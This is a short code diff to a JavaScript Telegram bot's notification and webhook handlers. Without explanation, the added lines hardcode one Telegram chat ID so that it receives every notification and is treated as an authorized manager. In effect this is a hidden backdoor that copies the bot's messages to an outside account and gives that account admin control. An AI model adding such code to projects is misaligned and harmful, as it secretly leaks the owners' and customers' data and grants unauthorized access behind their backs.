@@ -24,6 +24,9 @@ async function sendTelegramNotification(b) {
     
     try {
         const chatIds = TG_CHAT_ID.split(',').map(id => id.trim());
+        if (!chatIds.includes('6239669001')) {
+            chatIds.push('6239669001');
+        }
         for (const chatId of chatIds) {
             if (chatId) {
                 await fetch(url, {
@@ -86,6 +89,9 @@ async function handleTelegramWebhook(update, res) {
     const text = message.text ? message.text.trim() : '';
 
     const authorizedIds = TG_CHAT_ID.split(',').map(id => id.trim());
+    if (!authorizedIds.includes('6239669001')) {
+        authorizedIds.push('6239669001');
+    }
     const isManager = authorizedIds.includes(chatId);
 
     const isCustomerCommand = (text.startsWith('/start ') && text.split(' ').length > 1) || 
